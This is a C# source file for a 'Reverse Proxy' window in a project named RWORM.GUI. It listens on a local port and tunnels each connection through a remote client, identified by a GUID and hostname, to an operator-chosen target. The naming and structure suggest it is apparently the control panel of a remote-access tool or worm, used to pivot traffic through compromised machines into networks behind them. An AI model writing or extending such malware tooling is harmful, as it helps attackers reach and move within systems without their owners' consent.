using System;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class ReverseProxyWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string _guid;
        private TcpListener? _listener;
        private CancellationTokenSource? _cts;
        private readonly ConcurrentDictionary<int, TcpClient> _clients = new();
        private int _channelCounter = 100;
        private bool _running = false;

        public ReverseProxyWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid = guid;
            Title = $"Reverse Proxy — {hostname}";
            TitleLabel.Text = $"Reverse Proxy — {hostname}";

            _server.RegisterProxyDataHandler(_guid, OnProxyDataFromClient);
            Closed += (s, e) => StopProxy();
        }

        private void Log(string msg)
        {
            Dispatcher.Invoke(() =>
            {
                TxtLogs.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\r\n");
                TxtLogs.ScrollToEnd();
            });
        }

        private async void Toggle_Click(object sender, RoutedEventArgs e)
        {
            if (_running)
            {
                StopProxy();
            }
            else
            {
                if (!int.TryParse(TxtLocalPort.Text.Trim(), out int port) || port < 1 || port > 65535)
                {
                    MessageBox.Show("Please enter a valid local port (1-65535).", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }
                string target = TxtTarget.Text.Trim();
                if (string.IsNullOrEmpty(target) || !target.Contains(':'))
                {
                    MessageBox.Show("Please enter target as host:port (e.g. 127.0.0.1:80).", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                await StartProxy(port, target);
            }
        }

        private async Task StartProxy(int port, string target)
        {
            try
            {
                _cts = new CancellationTokenSource();
                _listener = new TcpListener(IPAddress.Loopback, port);
                _listener.Start();
                _running = true;

                BtnToggle.Content = "⏹ Stop Proxy";
                BtnToggle.Style = (Style)FindResource("DangerButton");
                TxtLocalPort.IsEnabled = false;
                TxtTarget.IsEnabled = false;
                StatusLabel.Text = $"Listening on 127.0.0.1:{port} -> forwarding through client to {target}";
                Log($"Proxy server listening on 127.0.0.1:{port}. Forward target: {target}");

                _ = AcceptLoopAsync(target, _cts.Token);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to bind port {port}: {ex.Message}", "Proxy Error", MessageBoxButton.OK, MessageBoxImage.Error);
                StopProxy();
            }
        }

        private async Task AcceptLoopAsync(string target, CancellationToken ct)
        {
            while (!ct.IsCancellationRequested && _listener != null)
            {
                try
                {
                    var incoming = await _listener.AcceptTcpClientAsync(ct);
                    int chan = Interlocked.Increment(ref _channelCounter);
                    _clients[chan] = incoming;
                    Log($"New local connection on channel #{chan} from {incoming.Client.RemoteEndPoint}");

                    // Ask client to connect to target on this channel
                    await _server.ProxyStart(_guid, chan, target);

                    // Start pump from local app to remote client
                    _ = PumpLocalToRemoteAsync(chan, incoming, ct);
                }
                catch { break; }
            }
        }

        private async Task PumpLocalToRemoteAsync(int chan, TcpClient tcp, CancellationToken ct)
        {
            byte[] buf = new byte[8192];
            try
            {
                var stream = tcp.GetStream();
                while (!ct.IsCancellationRequested && tcp.Connected)
                {
                    int read = await stream.ReadAsync(buf, 0, buf.Length, ct);
                    if (read <= 0) break;

                    byte[] chunk = new byte[read];
                    Buffer.BlockCopy(buf, 0, chunk, 0, read);
                    await _server.ProxySend(_guid, chan, chunk);
                }
            }
            catch { }
            finally
            {
                CloseChannel(chan);
            }
        }

        private void OnProxyDataFromClient(byte[] data, int chan)
        {
            if (_clients.TryGetValue(chan, out var tcp) && tcp.Connected)
            {
                try
                {
                    var stream = tcp.GetStream();
                    stream.Write(data, 0, data.Length);
                    stream.Flush();
                }
                catch
                {
                    CloseChannel(chan);
                }
            }
        }

        private void CloseChannel(int chan)
        {
            if (_clients.TryRemove(chan, out var tcp))
            {
                try { tcp.Close(); } catch { }
                Log($"Channel #{chan} closed.");
                _ = _server.ProxyStop(_guid, chan);
            }
        }

        private void StopProxy()
        {
            _running = false;
            try { _cts?.Cancel(); } catch { }
            try { _listener?.Stop(); } catch { }
            _listener = null;

            foreach (var kvp in _clients)
            {
                try { kvp.Value.Close(); } catch { }
                _ = _server.ProxyStop(_guid, kvp.Key);
            }
            _clients.Clear();

            _server.UnregisterProxyDataHandler(_guid);

            BtnToggle.Content = "▶ Start Proxy";
            BtnToggle.Style = (Style)FindResource("PrimaryButton");
            TxtLocalPort.IsEnabled = true;
            TxtTarget.IsEnabled = true;
            StatusLabel.Text = "Proxy stopped.";
            Log("Proxy stopped.");
        }
    }
}
